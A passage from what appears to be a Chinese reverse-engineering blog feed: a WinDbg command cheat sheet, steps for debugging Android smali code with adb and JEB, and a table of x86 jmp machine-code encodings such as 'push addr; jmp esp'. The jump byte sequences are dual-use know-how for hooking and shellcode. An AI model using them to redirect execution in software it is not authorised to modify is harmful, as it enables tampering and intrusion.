在0x445634地址写入ASCII字符串abc， 包含结束符0</li><li><code>eu 0x445634 “abc”</code> —— 在0x445634地址写入Unicode字符串abc，不包含结束符0</li><li><code>ezu 0x445634 “abc”</code>—— 在0x445634地址写入Unicode字符串abc，包含结束符0</li><li><code>ed nCounter 80</code> —— 修改变量nCounter的值为80</li><li><code>ew 00007ff9a9ddfc06 cc</code> —— 修改00007ff9`a9ddfc06处的双字节为0x00cc</li></ul></li><li><code>.writemem &lt;file&gt; &lt;address range&gt;</code> —— 将指定内存的内容写入文件中<ul><li><code>.writemem D:\\Test\\0041a5e4.bin 0041a5e4 L1000</code> ，将内存地址处0x0041a5e4后面0x1000长度的内容拷贝存储到D:\Test\0041a5e4.bin中</li></ul></li><li><code>S  \[&lt;options&gt;\] &lt;range&gt; &lt;values&gt;</code> —— 搜索内存<ul><li><code>s -w 55230000 L0x100 0x1212 0x2212</code> ，在起始地址0x55230000之后的0x100个单位内搜索0x1212 0x2212 0x1234系列的起始地址</li><li><code>s -u 52230000 52270000 &quot;web&quot;</code> ， 在55230000和55270000之间搜索Unicode字符串“web”</li><li><code>s -d 55230000 L0x100 0xdeadbeaf</code>，在起始地址0x55230000之后的0x100个单位内搜索0xdeadbeaf</li></ul></li></ul><h3 id="读写寄存器"><a href="#读写寄存器" class="headerlink" title="读写寄存器"></a>读写寄存器</h3><ul><li><code>r [[&lt;reg&gt; [= &lt;expr&gt;]]]</code>—— 查看或设置寄存器<ul><li><code>r</code> —— 查看所有寄存器值</li><li><code>r eax</code> —— 查看eax值</li><li><code>r rax = rip</code> —— 设置rax的值为rip值</li></ul></li></ul><h3 id="符号加载与查看"><a href="#符号加载与查看" class="headerlink" title="符号加载与查看"></a>符号加载与查看</h3><ul><li><code>.symopt</code> —— 显示所有符号选项</li><li><code>.reload</code> —— 重载符号表</li><li><code>ld *</code> —— 加载模块的符号信息<ul><li><code>ld *</code>  —— 为所有模块加载符号信息</li><li><code>ld kernel32</code> —— 为kernel32加载符号信息</li></ul></li><li><code>x [&lt;*|module&gt;!]&lt;*|symbol&gt;</code> —— 查看符号信息<ul><li><code>x *!</code> ，列出所有模块的符号信息</li><li><code>x edgehtml!</code>，列出edgehtml模块的符号信息</li><li><code>x edgehtml!CDOM*</code>，列出edgehtml模块中所有以CDOM开始的符号信息</li></ul></li><li><code>lm</code> —— 列出所有模块的信息</li><li><code>lmv m ntdll</code>—— 查看ntdll的加载信息（简略）</li><li><code>lmvm &lt;module name&gt;</code> —— 查看指定模块的详细信息</li><li><code>!dlls -l</code>—— 按照加载顺序列出所有加载模块</li><li><code>!dlls -c &lt;function_name&gt;</code> —— 查找函数所在模块</li><li><code>ln &lt;addr&gt;</code> —— 查看地址addr处或附近的符号信息</li></ul><h3 id="调用堆栈"><a href="#调用堆栈" class="headerlink" title="调用堆栈"></a>调用堆栈</h3><ul><li><code>k &lt;num&gt;</code>—— 显示当前调用堆栈<ul><li><code>k 5</code>，显示最近5层函数调用信息</li><li><code>kb 4</code>，打印出前3个函数参数的当前调用堆栈</li><li><code>kD</code>，从当前esp（rsp）开始，向高地址方向搜索符号（等价于 dds esp或dqs rsp）</li></ul></li><li><code>.frame</code> —— 显示当前栈帧<ul><li><code>.frame 4</code> —— 显示编号为n的栈帧</li></ul></li><li><code>!uniqstack</code> —— 显示所有线程的调用堆栈</li></ul><h3 id="查看堆"><a href="#查看堆" class="headerlink" title="查看堆"></a>查看堆</h3><ul><li><code>!heap -s</code> —— 显示进程堆的个数</li><li><code>dt _HEAP 001400000</code>  —— 选取一个堆地址，打印该堆的内存结构</li><li><code>!heap -a 001400000</code> —— 选取一个堆地址，打印堆结构</li></ul><h3 id="调试执行"><a href="#调试执行" class="headerlink" title="调试执行"></a>调试执行</h3><ul><li><code>g</code>——继续执行<ul><li><code>gH</code>，强制让调试器返回已经处理了这个异常</li><li><code>gN</code>，强制让调试器返回没有处理这个异常</li><li><code>gu</code>，执行到当前函数完成时停下，遇到ret指令停下</li></ul></li><li><code>wt</code> —— Trace and watch data， 在函数起始地址处执行该命令，跟踪并打印该函数内部调用过程</li><li><code>ctrl+break</code> —— 暂停正在运行的程序</li><li><code>p</code> —— 单步执行（step over)<ul><li><code>p 2</code>，单步执行2条指令</li><li><code>pc</code> (step to next call)， 执行到下一个函数调用处停下</li><li><code>pa 7c801b0b</code> ( step to address)，执行到7c801b0b处停下</li><li><code>pt</code>，step到下一条ret指令</li></ul></li><li><code>t</code>—— 单步步入（step into）<ul><li><code>tc</code> —— 执行到下一个call指令处停下</li><li><code>ta 7c801b0b</code>，执行到7c801b0b处停下</li><li><code>tb</code>，执行到分支指令处（calls、returns、jumps、loops）停下</li><li><code>tt</code>，trace到下一条ret指令</li></ul></li></ul><h3 id="查看汇编"><a href="#查看汇编" class="headerlink" title="查看汇编"></a>查看汇编</h3><ul><li><code>u</code>  —— 反汇编<ul><li><code>u</code> ，反汇编当前ip寄存器地址后的8条指令</li><li><code>ub</code> ，反汇编当前ip寄存器地址的前8条指令</li><li><code>u main+0x29 L30</code>，反汇编main+0x29地址的后30条指令</li><li><code>uf CTest::add</code> ，反汇编CTest类的add函数</li><li><code>uf /c main</code>，查看main中的函数调用有哪些</li></ul></li></ul><h3 id="查看数据类型与局部变量"><a href="#查看数据类型与局部变量" class="headerlink" title="查看数据类型与局部变量"></a>查看数据类型与局部变量</h3><ul><li><code>dt</code> —— 打印类型信息<ul><li><code>dt ntdll!\_IMAGE\_DOS\_HEADER</code>，打印ntdll中的_IMAGE_DOS_HEADER结构</li><li><code>dt nRet</code>，打印局部变量nRet的类型与值</li><li><code>dt myApp!g\_app</code>，打印myApp进程里全局变量g_app的内存布局</li><li><code>dt WindbgTest!CTest 0x0041f8b4</code>，将0x0041f8d4地址处内容按照模块WindbgTest的CTest结构来解析</li><li><code>dt -b -r3 &lt;structure&gt;</code>，-b 递归显示所有子类型信息，-r指定递归显示深度</li></ul></li><li><code>dv</code>—— 显示局部变量</li></ul><h3 id="诊断"><a href="#诊断" class="headerlink" title="诊断"></a>诊断</h3><ul><li><code>!analyze -v</code>—— 详细显示当前异常信息</li><li><code>!analyze -hang</code> —— 诊断线程调用栈上是否有任何线程阻塞了其他线程</li><li><code>!analyze -f</code> —— 查看异常分析信息，尽管调试器未诊断出异常</li></ul><h3 id="进程与线程"><a href="#进程与线程" class="headerlink" title="进程与线程"></a>进程与线程</h3><ul><li><code>!peb</code> —— 格式化输出PEB（Process Environment Block）信息</li><li><code>!teb</code> —— 格式化输出TEB（Thread Environment Block）信息</li><li><code>!tls -1</code> —— 显示当前线程的所有slot信息</li><li><code>|</code> —— 列出所有调试进程<ul><li><code>|N</code>，查看序号为N的调试进程</li><li><code>|Ns</code>，切换序号为N的进程为当前调试进程</li></ul></li><li><code>~</code> —— 列出所有线程<ul><li><code>~*k</code> —— 列出所有线程堆栈信息</li><li><code>~.</code> —— 查看当前线程</li><li><code>~0</code> —— 查看主线程</li><li><code>~#</code>  —— 查看导致当前事件或异常的线程</li><li><code>~N</code> —— 查看N号线程</li><li><code>~Ns</code> —— 切换序号为N的线程为当前调试线程</li><li><code>~Nf</code> —— 冻结序号为N的线程</li><li><code>~Nu</code> —— 解冻序号为N的线程</li><li><code>~Nn</code> —— Suspend序号为N的线程</li><li><code>~Nm</code> —— Resume序号为N的线程</li></ul></li></ul><h3 id="参考"><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><ol><li><a href="http://www.cnblogs.com/kekec/archive/2012/12/02/2798020.html" target="_blank" rel="noopener">http://www.cnblogs.com/kekec/archive/2012/12/02/2798020.html</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;命令介绍&quot;&gt;&lt;a href=&quot;#命令介绍&quot; class=&quot;headerlink&quot; title=&quot;命令介绍&quot;&gt;&lt;/a&gt;命令介绍&lt;/h3&gt;&lt;p&gt;windbg支持三种类型的命令，&lt;strong&gt;标准命令&lt;/strong&gt;、&lt;strong&gt;元命令&lt;/strong&gt;和&lt;st
      
    
    </summary>
    
      <category term="逆向" scheme="https://skysider.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="调试" scheme="https://skysider.github.io/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="windbg" scheme="https://skysider.github.io/tags/windbg/"/>
    
      <category term="windows" scheme="https://skysider.github.io/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>mac下进行smali动态调试</title>
    <link href="https://skysider.github.io/2017/07/16/mac%E4%B8%8B%E8%BF%9B%E8%A1%8Csmali%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/"/>
    <id>https://skysider.github.io/2017/07/16/mac下进行smali动态调试/</id>
    <published>2017-07-16T06:36:35.000Z</published>
    <updated>2018-05-12T03:56:55.345Z</updated>
    
    <content type="html"><![CDATA[<h3 id="第一种方法jeb"><a href="#第一种方法（jeb）" class="headerlink" title="第一种方法（jeb）"></a>第一种方法（jeb）</h3><ol><li>在模拟器或者真机中安装并运行apk</li><li><p>以调试模式启动应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb shell dumpsys activity top | head // 获取package name和activity name</span><br><span class="line">adb shell am start -D -n packagename/.activityname</span><br></pre></td></tr></table></figure></li><li><p>在jeb中设置断点，点击debug，选择设备和对应的调试进程</p></li></ol><h3 id="第二种方法android-studio-smalidea"><a href="#第二种方法（Android-Studio-Smalidea）" class="headerlink" title="第二种方法（Android Studio + Smalidea）"></a>第二种方法（Android Studio + Smalidea）</h3><ol><li>使用apktool或者Android Crack Tool解包apk</li><li>将解包的工程导入到Android Studio中</li><li><p>以调试模式启动应用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start -D -n packagename/.MainActivity</span><br></pre></td></tr></table></figure></li><li><p>启动monitor，选中调试应用，开启8700端口</p></li><li>在smali中设置断点，并且设置远程调试（Run-&gt;Edit Configurations-&gt; + -&gt; remote，设置端口为8700），点击debug</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;第一种方法jeb&quot;&gt;&lt;a href=&quot;#第一种方法（jeb）&quot; class=&quot;headerlink&quot; title=&quot;第一种方法（jeb）&quot;&gt;&lt;/a&gt;第一种方法（jeb）&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;在模拟器或者真机中安装并运行apk&lt;/li&gt;
&lt;li&gt;&lt;p&gt;以调试模
      
    
    </summary>
    
      <category term="逆向" scheme="https://skysider.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="调试" scheme="https://skysider.github.io/tags/%E8%B0%83%E8%AF%95/"/>
    
      <category term="android" scheme="https://skysider.github.io/tags/android/"/>
    
      <category term="smali" scheme="https://skysider.github.io/tags/smali/"/>
    
  </entry>
  
  <entry>
    <title>x86汇编——jmp指令</title>
    <link href="https://skysider.github.io/2017/05/25/x86%E6%B1%87%E7%BC%96%E2%80%94%E2%80%94jump%E6%8C%87%E4%BB%A4/"/>
    <id>https://skysider.github.io/2017/05/25/x86汇编——jump指令/</id>
    <published>2017-05-24T16:19:11.000Z</published>
    <updated>2018-05-12T04:03:38.073Z</updated>
    
    <content type="html"><![CDATA[<h3 id="相对地址跳转"><a href="#相对地址跳转" class="headerlink" title="相对地址跳转"></a>相对地址跳转</h3><table><thead><tr><th>伪代码</th><th>机器码</th><th>示例</th></tr></thead><tbody><tr><td>jmp short s</td><td>eb+offset（1个字节）</td><td>eb03 ，ebfd</td></tr><tr><td>jmp near ptr s</td><td>e9+offset（4个字节）</td><td>e996000000, e964ffffff</td></tr></tbody></table><h3 id="绝对地址跳转"><a href="#绝对地址跳转" class="headerlink" title="绝对地址跳转"></a>绝对地址跳转</h3><table><thead><tr><th>位数</th><th>伪代码</th><th>机器码</th><th>示例</th></tr></thead><tbody><tr><td>32</td><td>push addr; jmp esp;</td><td>68+addr(4个字节 )+ffe4</td><td>68afbeaddeffe4</td></tr><tr><td>64</td><td>mov rax, addr; jmp rax;</td><td>48b8+addr(8个字节)+ffe0</td><td>48b8afbeaddeafbeafdeffe0</td></tr></tbody></table>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;相对地址跳转&quot;&gt;&lt;a href=&quot;#相对地址跳转&quot; class=&quot;headerlink&quot; title=&quot;相对地址跳转&quot;&gt;&lt;/a&gt;相对地址跳转&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;伪代码&lt;/th&gt;
&lt;th&gt;机器码&lt;/th&gt;
&lt;th&gt;示例&lt;/th
      
    
    </summary>
    
      <category term="逆向" scheme="https://skysider.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
      <category term="汇编" scheme="https://skysider.github.io/tags/%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
</feed>
